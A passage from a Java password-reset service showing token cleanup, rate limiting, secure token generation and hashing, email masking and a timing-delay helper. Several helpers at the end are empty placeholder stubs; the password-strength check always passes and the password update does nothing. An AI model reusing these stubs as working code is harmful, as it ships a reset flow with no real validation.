    }

    // Scheduled cleanup of expired tokens - runs every hour
    @Scheduled(fixedRate = 3600000)
    public void cleanupExpiredTokens() {
        logger.info("Starting expired token cleanup job");

        try (Connection conn = dataSource.getConnection()) {
            // Delete tokens expired more than 24 hours ago (keep recent for audit)
            String sql = "DELETE FROM password_reset_tokens WHERE expires_at < NOW() - INTERVAL '24 hours'";
            PreparedStatement stmt = conn.prepareStatement(sql);
            int deleted = stmt.executeUpdate();

            logger.info("Cleaned up {} expired password reset tokens", deleted);
            meterRegistry.counter("password_reset.cleanup.deleted").increment(deleted);

        } catch (SQLException e) {
            logger.error("Error cleaning up expired tokens", e);
        }

        // Clean up old rate limiter entries
        cleanupRateLimiters();
    }

    private boolean checkIpRateLimit(String ipAddress) {
        Bucket bucket = ipRateLimiters.computeIfAbsent(ipAddress, k -> 
            Bucket.builder()
                .addLimit(Bandwidth.classic(MAX_REQUESTS_PER_IP_PER_HOUR, Refill.greedy(MAX_REQUESTS_PER_IP_PER_HOUR, java.time.Duration.ofHours(1))))
                .build()
        );
        return bucket.tryConsume(1);
    }

    private boolean checkEmailRateLimit(String email) {
        String normalizedEmail = email.toLowerCase().trim();
        Bucket bucket = emailRateLimiters.computeIfAbsent(normalizedEmail, k -> 
            Bucket.builder()
                .addLimit(Bandwidth.classic(MAX_REQUESTS_PER_EMAIL_PER_HOUR, Refill.greedy(MAX_REQUESTS_PER_EMAIL_PER_HOUR, java.time.Duration.ofHours(1))))
                .build()
        );
        return bucket.tryConsume(1);
    }

    private void cleanupRateLimiters() {
        // Remove empty buckets to prevent memory leak
        ipRateLimiters.entrySet().removeIf(entry -> 
            entry.getValue().getAvailableTokens() >= MAX_REQUESTS_PER_IP_PER_HOUR);
        emailRateLimiters.entrySet().removeIf(entry -> 
            entry.getValue().getAvailableTokens() >= MAX_REQUESTS_PER_EMAIL_PER_HOUR);
    }

    private String generateSecureToken() {
        byte[] tokenBytes = new byte[TOKEN_LENGTH_BYTES];
        secureRandom.nextBytes(tokenBytes);
        return Base64.getUrlEncoder().withoutPadding().encodeToString(tokenBytes);
    }

    private String hashToken(String token) {
        try {
            java.security.MessageDigest digest = java.security.MessageDigest.getInstance("SHA-256");
            byte[] hash = digest.digest(token.getBytes(java.nio.charset.StandardCharsets.UTF_8));
            return Base64.getEncoder().encodeToString(hash);
        } catch (Exception e) {
            throw new RuntimeException("Failed to hash token", e);
        }
    }

    private String maskEmail(String email) {
        if (email == null) return "***";
        int atIndex = email.indexOf('@');
        if (atIndex > 2) {
            return email.substring(0, 2) + "***" + email.substring(atIndex);
        }
        return "***";
    }

    private void simulateProcessingDelay() {
        try {
            Thread.sleep(100 + secureRandom.nextInt(200));
        } catch (InterruptedException e) {
            Thread.currentThread().interrupt();
        }
    }

    // Additional helper methods omitted for brevity
    private boolean emailExists(Connection conn, String email) throws SQLException { return true; }
    private int countActiveTokens(Connection conn, String email) throws SQLException { return 0; }
    private void markTokenUsed(Connection conn, long tokenId, String ip) throws SQLException { }
    private void invalidateAllTokens(Connection conn, String email) throws SQLException { }
    private void updatePassword(Connection conn, String email, String hash) throws SQLException { }
    private void invalidateUserSessions(Connection conn, String email) throws SQLException { }
    private void sendResetEmailAsync(String email, String token) { }
    private void sendPasswordChangedNotificationAsync(String email, String ip) { }
    private String truncateUserAgent(String ua) { return ua != null ? ua.substring(0, Math.min(ua.length(), 255)) : null; }
    private PasswordStrengthResult validatePasswordStrength(String password) { return new PasswordStrengthResult(true, ""); }
}

class PasswordResetResult {
    private final boolean success;
    private final String message;

    private PasswordResetResult(boolean success, String message) {
        this.success = success;
        this.message = message;
    }

